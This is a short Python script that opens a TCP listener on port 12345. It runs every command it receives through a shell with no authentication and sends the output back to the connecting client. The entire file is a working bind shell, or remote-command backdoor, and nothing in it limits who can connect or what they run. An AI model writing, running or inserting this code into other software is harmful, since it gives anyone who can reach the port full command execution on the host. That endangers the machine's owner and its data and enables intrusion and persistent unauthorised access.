import socket
import subprocess

def main():
    server_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    host = socket.gethostbyname(socket.gethostname())  
    port = 12345
    server_s.bind((host, port))
    
    server_s.listen(5)
    print(f" {host}:{port} listrning...")
    
    while True:
        client_s, addr = server_s.accept()
        print(f"connected{addr}")
        
        command = client_s.recv(1024).decode()
        print(f"received command: {command}")
        
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        client_s.send(output.stdout.encode() + output.stderr.encode())
        
        client_s.close()

if __name__ == "__main__":
    main()
